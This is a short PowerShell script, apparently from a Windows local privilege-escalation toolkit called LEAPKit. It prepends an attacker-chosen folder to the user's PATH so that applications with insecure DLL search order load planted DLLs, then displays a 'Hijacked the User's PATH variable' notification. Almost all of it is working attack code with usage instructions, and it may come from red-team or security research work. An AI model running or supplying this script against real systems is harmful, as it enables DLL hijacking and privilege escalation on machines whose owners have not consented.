<#

PoisonPath.ps1 

A component of Windows 7.x, 8.x, and 10.x Local Elevation of Attacker's Privileges Toolkit (#LEAPKit) 
by Greg Linares (@Laughing_Mantis) of Cyberpoint SRT 

Poison Path is a simple script which will add a controlled folder to a user's 
PATH variable in order to hijack potential DLL Search Order vulnerabilities.  

This is a simple yet still a viable method to target applications who utilize insecure LoadLibraryEx calls 
and should be used prior to exploiting DLL path issues.


Usage:
FollowThePathOfEvil.ps1 -SHOW
FollowThePathOfEvil.ps1 -PATH C:\Tools\LEAP\DLL 

#>

Param
(
    [ValidateNotNullOrEmpty()]
    [string]$Path = '',

    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [switch]$Show
)




$PathEnv = [Environment]::GetEnvironmentVariable("Path")

if ($Show)
{
    
    Write-Host "The current PATH Environment Variable is: $PathEnv" -ForegroundColor Green
    exit 
}

if(!(Test-Path  $Path -PathType Container))
{
    throw "Fatal Error: The specified folder $Path does not exist"
}

Write-Host "Adding $Path to the PATH Environment variable" -ForegroundColor Red

[Environment]::SetEnvironmentVariable("PATH", $Path + ';' + $PathEnv, "User")

[void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")

$objNotifyIcon = New-Object System.Windows.Forms.NotifyIcon 


$MyPath = Get-Process -id $pid | Select-Object -ExpandProperty Path
$objNotifyIcon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($MyPath)
$objNotifyIcon.BalloonTipIcon = "Info" 
$objNotifyIcon.BalloonTipText = "Hijacked the User's PATH variable.
Confirm with the Control Panel\User Accounts\User Accounts - Change My Env Variables Tab" 
$objNotifyIcon.BalloonTipTitle = "LEAP Toolkit"
 
$objNotifyIcon.Visible = $True 
$objNotifyIcon.ShowBalloonTip(8000)




